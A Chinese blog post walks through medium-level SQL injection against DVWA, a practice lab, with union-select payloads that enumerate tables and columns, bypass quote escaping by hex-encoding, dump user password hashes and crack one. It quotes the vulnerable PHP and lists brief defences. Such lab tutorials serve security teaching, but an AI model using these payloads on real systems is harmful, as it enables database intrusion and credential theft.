---
layout: post
title: DVWA之中级SQL注入
date: '2021-03-22 17:38:20 +0800'
categories: technology
tags: ubuntu apache mysql php phpmyadmin git hack web dvwa
img: https://i.loli.net/2021/03/24/7SbDB5YZzR4peXq.png
themecolor: "#fff"
themetextcolor: "#000"
describe: SQL Injection in DVWA
---

## 什么是SQL注入

所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令，比如先前的很多影视网站泄露 VIP 会员密码大多就是通过 WEB 表单递交查询字符暴出的，这类表单特别容易受到 SQL 注入式攻击．当应用程序使用输入内容来构造动态 SQL 语句以访问数据库时，会发生 SQL 注入攻击。如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生 SQL 注入。

## SQL注入产生的原因

SQL 注入攻击是利用是指利用设计上的漏洞，在目标服务器上运行 SQL 语句以及进行其他方式的攻击，动态生成 SQL 语句时没有对用户输入的数据进行验证是 SQL 注入攻击得逞的主要原因。对于 Java 数据库连接 JDBC 而言，SQL 注入攻击只对 `Statement` 有效，对 `PreparedStatement` 是无效的，这是因为 `PreparedStatement` 不允许在不同的插入时间改变查询的逻辑结构。

如验证用户是否存在的 SQL 语句为：`用户名’and pswd=' 密码`

如果在用户名字段中输入: `'or 1=1` 或是在密码字段中输入:`'or 1=1`将绕过验证，但这种手段只对只对 `Statement` 有效，对 `PreparedStatement` 无效。相对 `Statement` 有以下优点：

1. 防注入攻击
2. 多次运行速度快
3. 防止数据库缓冲区溢出
4. 代码的可读性可维护性好

这四点使得 `PreparedStatement` 成为访问数据库的语句对象的首选，缺点是灵活性不够好，有些场合还是必须使用 `Statement`。


## SQL注入原理

<img src="/assets/images/posts/dvwa/sql/sql.png">

SQL 注入能使攻击者绕过认证机制，完全控制远程服务器上的数据库。 SQL 是结构化查询语言的简称，它是访问数据库的事实标准。目前，大多数 Web 应用都使用 SQL 数据库来存放应用程序的数据。几乎所有的 Web 应用在后台 都使用某种 SQL 数据库。跟大多数语言一样，SQL 语法允许数据库命令和用户数据混杂在一起的。如果开发人员不细心的话，用户数据就有可能被解释成命令， 这样的话，远程用户就不仅能向 Web 应用输入数据，而且还可以在数据库上执行任意命令了。

SQL 注入式攻击的主要形式有两种。一是直接将代码插入到与 SQL 命令串联在一起并使得其以执行的用户输入变量。由于其直接与 SQL 语句捆绑，故也被称为直接注入式攻击法。二是一种间接的攻击方法，它将恶意代码注入要在表中存储或者作为原数据存储的字符串。在存储的字符串中会连接到一个动态的 SQL 命令中，以执行一些恶意的 SQL 代码。注入过程的工作方式是提前终止文本字符串，然后追加一个新的命令。如以直接注入式攻击为例。就是在用户输入变量的时候，先用一个分号结束当前的语句。然后再插入一个恶意 SQL 语句即可。由于插入的命令可能在执行前追加其他字符串，因此攻击者常常用注释标记 “—” 来终止注入的字符串。执行时，系统会认为此后语句位注释，故后续的文本将被忽略，不背编译与执行。

## SQL注入常用的函数

| 函数名称 | 函数功能               |
| ----------------- | ------------------ |
| `system_user()`               | 系统用户名 |
| `user()`                      | 用户名                  |
| `current_user()`              | 当前用户名                   |
| `session_user()`              | 连接数据库的用户名                  |
| `database()`                  | 数据库名                  |
| `version()`                   | 数据库版本                  |
| `@@datadir`                   | 数据库路径                  |
| `@@basedir`                   | 数据库的安装路径                  |
| `@@version_compile_os`        | 操作系统                  |
| `count()`                     | 返回执行结果数量                  |
| `concat()`                    | 没有分隔符地连接字符串                  |
| `concat_ws()`                 | 含有分隔符地连接字符串                  |
| `group_concat()`              | 连接一个组的所有字符串，并以逗号分隔每一条数据                  |
| `load_file()`                 | 读取本地文件                  |
| `into outfile`                | 写文件                  |
| `ascii()`                     | 字符串的ASCII码值                  |
| `ord()`                       | 返回字符串第一个字符的ASCII码值                  |
| `mid()`                       | 返回一个字符串的一部分                 |
| `substr()`                    | 返回一个字符串的一部分                  |
| `length()`                    | 返回字符串的长度                  |


## medium级别SQL注入

对于没有输入框，却又存在SQL注入漏洞可以用`burpsuit`抓包或`hackbar`插件来修改参数。(本文使用burp suite)

### 1. 判断是否存在注入以及注入类型
   
   当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。

抓包更改参数为`1' and 1=1`,返回报错
<img src="/assets/images/posts/dvwa/sql/1.png">


抓包更改参数为`1 and 1=1`,查询成功
<img src="/assets/images/posts/dvwa/sql/2.png">

所以判断出注入类型为数字型注入，由于是数字型注入，服务器端的`mysql_real_escape_string`函数就形同虚设了，因为数字型注入并不需要借助引号.

### 2. 猜SQL查询语句的字段数

抓包更改参数为`1 order by 2`,查询成功
<img src="/assets/images/posts/dvwa/sql/3.png">

抓包更改参数为`1 order by 3`,查询失败
<img src="/assets/images/posts/dvwa/sql/4.png">

由此可判断出SQL查询语句中只有两个字段.

### 3. 确定显示字段的顺序

抓包更改参数为`1 union select 1,2`,查询成功
<img src="/assets/images/posts/dvwa/sql/5.png">

### 4. 获取当前的数据库名

抓包更改参数为`1 union select 1,database()`,查询成功
<img src="/assets/images/posts/dvwa/sql/6.png">

当前数据库名为dvwa

### 5. 获取数据库中的表

抓包更改参数为`1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`,查询成功
<img src="/assets/images/posts/dvwa/sql/7.png">

数据库中存在两个表，分别为guestbook和users

### 6. 获取users表中的字段名

抓包更改参数为`1 union select 1,group_concat(column_name) from information_schema.columns where table_name=‘users’`,查询失败
<img src="/assets/images/posts/dvwa/sql/8.png">

> 这是因为`'`在这里被转义成了`\'`，我们把`users`转为16进制绕过

抓包更改参数为`1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273`,查询成功
<img src="/assets/images/posts/dvwa/sql/9.png">

### 7. 获取users表中的用户名和密码

抓包更改参数为`1 union select user,password from users`,查询成功
<img src="/assets/images/posts/dvwa/sql/10.png">

在这里我们把Firstname为`smithy`对应的Surname解md5

<img src="/assets/images/posts/dvwa/sql/11.png">

得到用户名为`smithy`对应的密码为`password`

并在dvwa中用smithy登录，下图为用`smithy`账户登录成功的截图。

<img src="/assets/images/posts/dvwa/sql/12.png">

### 源码分析

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = mysql_real_escape_string( $id );

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    // Get results
    $num = mysql_numrows( $result );
    $i   = 0;
    while( $i < $num ) {
        // Display values
        $first = mysql_result( $result, $i, "first_name" );
        $last  = mysql_result( $result, $i, "last_name" );

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";

        // Increase loop count
        $i++;
    }

    //mysql_close();
}

?> 

```

 Medium 级别的代码利用 `mysql_real_escape_string` 函数对特殊符号进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。虽然前端使用了下拉选择菜单，但我们依然可以通过改参数，提交恶意构造的查询参数。


## SQL注入防御措施

1. 始终以 `PreparedStatement` 代替 `Statement`
2. 过滤SQL语句关键字
3. 使用正则表达式来检查SQL
